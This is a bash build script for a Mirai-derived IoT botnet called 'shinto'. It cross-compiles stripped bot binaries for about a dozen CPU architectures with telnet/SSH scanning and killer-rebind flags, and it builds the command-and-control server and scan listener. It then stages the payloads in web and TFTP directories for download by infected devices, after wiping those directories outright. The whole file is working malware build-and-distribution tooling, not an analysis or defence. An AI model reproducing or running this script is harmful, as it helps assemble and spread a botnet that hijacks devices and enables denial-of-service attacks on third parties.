#!/bin/bash
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
FLAGS="-DMIRAI_TELNET -DKILLER_REBIND_TELNET -DMIRAI_SSH -DKILLER_REBIND_SSH"
rm -rf release
mkdir release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/3MaF4G
go build -o release/cnc cnc/*.go
go build -o release/scanListen scanListen.go
compile_bot i586 shinto.x86 "$FLAGS -static"
compile_bot mips shinto.mips "$FLAGS -static"
compile_bot mipsel shinto.mpsl "$FLAGS -static"
compile_bot armv4l shinto.arm4 "$FLAGS -static"
compile_bot armv5l shinto.arm5 "$FLAGS"
compile_bot armv6l shinto.arm6 "$FLAGS -static"
compile_bot armv7l shinto.arm7 "$FLAGS -static"
compile_bot powerpc shinto.ppc "$FLAGS -static"
compile_bot sparc shinto.spc "$FLAGS -static"
compile_bot m68k shinto.m68k "$FLAGS -static"
compile_bot sh4 shinto.sh4 "$FLAGS -static"

compile_bot i586 shintoo.x86 "-static -DMIRAI_TELNET"
compile_bot mips shintoo.mips "-static -DMIRAI_TELNET"
compile_bot mipsel shintoo.mpsl "-static -DMIRAI_TELNET"
compile_bot armv4l shintoo.arm "-static -DMIRAI_TELNET"
compile_bot armv5l shintoo.arm5 "-DMIRAI_TELNET"
compile_bot armv6l shintoo.arm6 "-static -DMIRAI_TELNET"
compile_bot armv6l shintoo.arm7 "-static -DMIRAI_TELNET"
compile_bot powerpc shintoo.ppc "-static -DMIRAI_TELNET"
compile_bot sparc shintoo.spc "-static -DMIRAI_TELNET"
compile_bot m68k shintoo.m68k "-static -DMIRAI_TELNET"
compile_bot sh4 shintoo.sh4 "-static -DMIRAI_TELNET"
cp release/shinto* /var/www/html/3MaF4G
mv release/shinto* /var/lib/tftpboot